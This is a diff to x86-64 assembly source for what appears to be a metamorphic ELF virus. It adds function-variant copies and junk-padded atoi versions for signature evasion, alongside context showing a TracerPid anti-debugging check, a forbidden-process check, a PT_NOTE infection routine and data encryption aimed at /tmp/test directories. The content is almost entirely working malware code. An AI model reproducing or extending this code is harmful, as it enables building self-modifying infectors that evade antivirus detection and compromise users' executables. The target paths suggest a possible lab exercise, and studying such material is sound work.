@@ -198,9 +198,13 @@ section .text
             add rax, rcx            ; resultado += digito
             inc rsi                 ; siguiente caracter
             jmp .loop
+            nop
+            nop
+            nop
         .done:
             ret
     __F_atoi__end:
+    F_atoi_len equ $ - __F_atoi
 
     __F_set_unique_trace:
         ; rax = integer from atoi(signature)
@@ -789,14 +793,21 @@ section .text
 
 	.mod_functions:
         SWAPALYZER(crazy, 7)
+        COPYLYZER(crazy)
         SWAPALYZER(mod_pt_note, 2)
+        COPYLYZER(mod_pt_note)
         SWAPALYZER(directory_name_isdigit, 3)
-        SWAPALYZER(fake_function, 4)
+        COPYLYZER(directory_name_isdigit)
+        SWAPALYZER(fake_function, 5)
+        COPYLYZER(fake_function)
+        SWAPALYZER(atoi, 3)
+        COPYLYZER(atoi)
 
-        CALL_METAMORPH(crazy, 7)
-        CALL_METAMORPH(mod_pt_note, 2)
-        CALL_METAMORPH(directory_name_isdigit, 3)
-        CALL_METAMORPH(fake_function, 4)
+        ;CALL_METAMORPH(crazy, 7)
+        ;CALL_METAMORPH(mod_pt_note, 2)
+        ;CALL_METAMORPH(directory_name_isdigit, 3)
+        ;CALL_METAMORPH(fake_function, 4)
+        ;CALL_METAMORPH(atoi, 3)
          
 
     .encrypt_data_block:
@@ -879,7 +890,7 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      "/vim"
+    forbidden_prog  db      "/test"
     forbidden_prog_len equ  $ - forbidden_prog - 1
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
@@ -1399,5 +1410,69 @@ section .text
     __F_fake_function_3:
         times 50 or al, 1
     __F_fake_function_3__end:
+
+    __F_fake_function_4:
+        times 50 xor eax, eax
+    __F_fake_function_4__end:
+
+    __F_atoi_0:
+        ; rax = resultado
+        nop
+        nop
+        .str_to_int:
+            xor rax, rax
+        .loop:
+            movzx rcx, byte [rsi]   ; cargar caracter
+            test rcx, rcx           ; ¿fin de string?
+            jz .done
+            sub rcx, '0'            ; convertir ASCII a número
+            imul rax, rax, 10       ; resultado *= 10
+            add rax, rcx            ; resultado += digito
+            inc rsi                 ; siguiente caracter
+            jmp .loop
+            nop
+        .done:
+            ret
+    __F_atoi_0__end:
+
+    __F_atoi_1:
+        ; rax = resultado
+        nop
+        .str_to_int:
+            xor rax, rax
+        .loop:
+            movzx rcx, byte [rsi]   ; cargar caracter
+            test rcx, rcx           ; ¿fin de string?
+            jz .done
+            sub rcx, '0'            ; convertir ASCII a número
+            imul rax, rax, 10       ; resultado *= 10
+            add rax, rcx            ; resultado += digito
+            inc rsi                 ; siguiente caracter
+            jmp .loop
+            nop
+            nop
+        .done:
+            ret
+    __F_atoi_1__end:
+
+    __F_atoi_2:
+        ; rax = resultado
+        .str_to_int:
+            xor rax, rax
+        .loop:
+            movzx rcx, byte [rsi]   ; cargar caracter
+            test rcx, rcx           ; ¿fin de string?
+            jz .done
+            sub rcx, '0'            ; convertir ASCII a número
+            imul rax, rax, 10       ; resultado *= 10
+            add rax, rcx            ; resultado += digito
+            inc rsi                 ; siguiente caracter
+            jmp .loop
+            nop
+            nop
+            nop
+        .done:
+            ret
+    __F_atoi_2__end:
 
     _finish:
